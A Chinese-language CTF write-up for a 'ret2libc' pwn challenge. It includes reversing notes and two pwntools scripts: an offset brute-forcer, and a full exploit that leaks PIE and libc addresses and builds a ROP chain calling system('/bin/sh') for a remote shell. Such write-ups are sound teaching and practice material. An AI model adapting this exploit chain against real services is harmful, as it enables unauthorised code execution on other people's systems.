# ret2libc 

## 文件分析

下载`ret2libc`, NX on, PIE on, RELRO full  
ghidra分析为64位程序

## 逆向

main函数中先是scan了一个int，可以利用它来*泄露main的地址*以找到PIE偏移  
然后一个read提供*栈溢出*的空间  
和ciscn那题一样，就能完成ret2libc

## EXPLOIT

通过爆破获取main的偏移，如果打印出来的地址以0000结尾，则爆破成功

```python
# inserted in the code block below
for offset in range(8, 128, 8):
    sh = remote(???, 10022)
    sh.sendline(str(offset).encode())
    data = sh.recvline()
    data = sh.recvuntil(b'sh')
    pieBase = u64(data[-8:-2] + b'\0\0') - main
    print(hex(pieBase))
    sh.close()
```

```python
from pwn import *
sh = remote('???', 10022)
elf = ELF('ret2libc')

sh.sendline(b'56') # Locating address of main on stack
sh.recvline() # skip
data = sh.recvuntil(b'sh')

main = elf.symbols['main']
pieBase = u64(data[-8:-2] + b'\0\0') - main
putsPlt = pieBase + elf.plt['puts']
putsGot = pieBase + elf.got['puts']
popRdiAddr = pieBase + 0x923
mainAddr = pieBase + main

print(hex(pieBase))

# payload 1
sh.sendline(b'0'*0x18 + p64(popRdiAddr) + p64(putsGot) + p64(putsPlt) + p64(mainAddr))

sh.recvuntil(b'shoot!\n') # skip
data = sh.recvline()

# 题中已给出libc
libcBase = u64(data[:6] + b'\0\0') - 0x80970
systemAddr = libcBase + 0x4f420
shstrAddr = libcBase + 0x1b3d88
retAddr = pieBase + 0x8bb

sh.sendline(b'0') # 埋伏我一手
# payload 2
sh.sendline(b'0'*0x18 + p64(popRdiAddr) + p64(shstrAddr) + p64(retAddr) + p64(systemAddr))

sh.interactive()
```

## 本题获得的教训

由于远端libc的不同，main在stack上的地址也是不一样的

Done.
